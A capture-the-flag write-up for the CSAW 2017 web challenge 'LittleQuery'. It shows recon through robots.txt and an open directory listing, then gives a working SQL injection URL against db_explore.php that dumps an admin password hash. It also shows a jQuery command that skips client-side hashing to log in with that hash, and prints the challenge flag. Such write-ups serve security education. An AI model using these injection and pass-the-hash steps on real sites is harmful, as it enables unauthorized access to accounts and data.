# CSAWCTF_2017: LittleQuery

**Category:** Web
**Points:** 200
**Description:**

>I've got a new website for BIG DATA analytics!
http://littlequery.chal.csaw.io

## Write-up
This challenge is a straightforward database injection attack challenge, with a bit of recon mixed in. This challenge starts with seeing the `robots.txt` page.

    User-agent: *
    Disallow: /api

From there, we discover a hidden part of the site, `/api`!

    Index of /api

    [ICO]   Name    Last modified   Size    Description
    [PARENTDIR] Parent Directory        -    
    [   ]   db_explore.php  2017-09-13 10:36    1.9K     
    Apache/2.4.18 (Ubuntu) Server at littlequery.chal.csaw.io Port 80

This leads us to `db_explore.php`. Upon further testing, there were two factors towards solving the challenge. First, is the mode `schema` and second, the mode `preview`. Upon further testing, we end up with 3 things.

    http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user

    http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=users

In this case, `%23` stands for `#`, to comment out the rest of the SQL statement. Now, we have the user credentials.

    admin:5896e92d38ee883cc09ad6f88df4934f6b074cf8

Since the password is hashed clientside before sending to server, we can simply prevent the hashing from taking place and sending the hash, using this JS command!

    $(".form-signin").off()

Therefore, the flag is `flag{mayb3_1ts_t1m3_4_real_real_escape_string?}`.
